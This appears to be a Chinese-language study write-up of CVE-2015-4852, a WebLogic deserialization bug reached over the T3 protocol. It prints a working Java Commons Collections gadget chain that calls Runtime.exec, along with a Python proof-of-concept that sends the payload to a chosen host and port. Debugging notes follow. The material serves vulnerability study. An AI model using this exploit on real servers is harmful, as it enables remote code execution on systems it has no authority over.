# CVE-2015-4852

## T3协议简析

简单了解一下t3协议,因为这个漏洞是利用t3作为攻击方式

t3协议是对rmi使用的标准封装,也即是t3协议在互相通信的过程中,传输的都是序列化的数据

t3协议的请求分为两部分,第一部分为请求头

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled.png)

第二部分为请求体

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%201.png)

下面是请求体的构成

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%202.png)

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%203.png)

那么利用方式其实就是替换到后面正常的序列化数据为恶意的序列化数据

## 漏洞利用和分析

首先需要利用cc1来生成一个反序列化的攻击向量

```java
/**
     * 漏洞利用链,这里使用了LazyMap$get这个方法
     * ObjectInputStream.readObject()
     * AnnotationInvocationHandler.readObject()
     * Map(Proxy).entrySet()
     * AnnotationInvocationHandler.invoke()
     * LazyMap.get()
     * ChainedTransformer.transform()
     * ConstantTransformer.transform()
     * InvokerTransformer.transform()
     * Method.invoke()
     * Class.getMethod()
     * InvokerTransformer.transform()
     * Method.invoke()
     * Runtime.getRuntime()
     * InvokerTransformer.transform()
     * Method.invoke()
     * Runtime.exec()
     **/
    public static void vulnToLazyMap() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"touch /tmp/success"})}
        );
        HashMap hashMap = new HashMap();
        Map decorate = LazyMap.decorate(hashMap, chainedTransformer);

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorate);
        Map invocation_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler);
        InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Target.class, invocation_map);

        SerializeUtil.writeObjectToFile(o);
        SerializeUtil.readObjectToFile();
    }
```

> [https://github.com/v1f18/SerializerChain/blob/main/Common-collections/src/main/java/vuln/Commoncollections1.java](https://github.com/v1f18/SerializerChain/blob/main/Common-collections/src/main/java/vuln/Commoncollections1.java) (具体的代码)
> 

生成的文件在下面的py脚本中使用

poc

```python
import binascii
import socket
import argparse

def exp(ip, port, file):
    t3_header = 't3 10.3.6\nAS:255\nHL:19\n\n'
    host = (ip, int(port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect(host)
    # send t3 header
    sock.sendall(t3_header.encode('utf-8'))
    resp1 = sock.recv(1024)
    print("resp-part1:\n" + str(resp1))
    resp2 = sock.recv(1024)
    print("resp-part2:\n" + str(resp2))
    data1 = '016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000'

    # second payload
    with open(file, 'rb') as f:
        payload = binascii.b2a_hex(f.read()).decode('utf-8')
    data = data1 + payload
    data = '%s%s' % ('{:08x}'.format(len(data) // 2 + 4), data)
    print("send payload ...")
    sock.send(binascii.a2b_hex(data))
    print(sock.recv(1024))

if __name__ == '__main__':
    args = argparse.ArgumentParser()
    args.add_argument("-i","--ip")
    args.add_argument("-p","--port")
    args.add_argument("-f","--file",default="poc.ser")
    arg = args.parse_args()
    if (arg.ip != None) & (arg.port != None):
        exp(arg.ip,arg.port,arg.file)
```

调试过程

发送pyload之后,先看一处比较关键的代码

InboundMsgAbbrev$ServerChannelInputStream#resolveClass

我们知道resolveClass方法是用来在反序列化过程中加载类的定义的,也就是可以加载一些自定义的类

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%204.png)

看一下var1的数据

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%205.png)

其实就是反序列化串

super.resolveClass()进入父类的resolveClass方法,也就是ObjectInputStream

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%206.png)

可以看见这里返回了AnnotationInvocationHandler类的class对象

然后在回到下面的循环里面

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%207.png)

查看一下这个var1.head是什么

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%208.png)

这里比较直观了,head就是用cc1链子生成的poc

跟进this.readObject(var1)

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%209.png)

查看var1.read()

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%2010.png)

进入到父类的read方法里

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%2011.png)

这个方法主要用来读取head中的序列化数据,返回0

然后回到readObject

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%2012.png)

**这里把var1传进去了,**看一下对应的构造方法

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%2013.png)

一直跟进var1.getServerChannel()

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%2014.png)

这里的MuxableSocketT3类有一个静态代码

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%2015.png)

在脚本运行的时候返回的数据中就包含了这个

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%2016.png)

channel包含了一些socket处理的流程

接着调用ServerChannelInputStream的readObject方法,其实就是调用了父类ObjectInputStream的readObject方法,然后因为var1中包含了反序列化串,所以还会调用AnnotationInvocationHandler的readObject方法

![Untitled](CVE-2015-4852%20d6ade06beb49479788a2b125e4ce73fb/Untitled%2017.png)

下面就是cc1的流程了

## 总结

上面的调试过程还是需要多调试几遍,感觉还是有些地方不太懂,只能说有个大概的了解了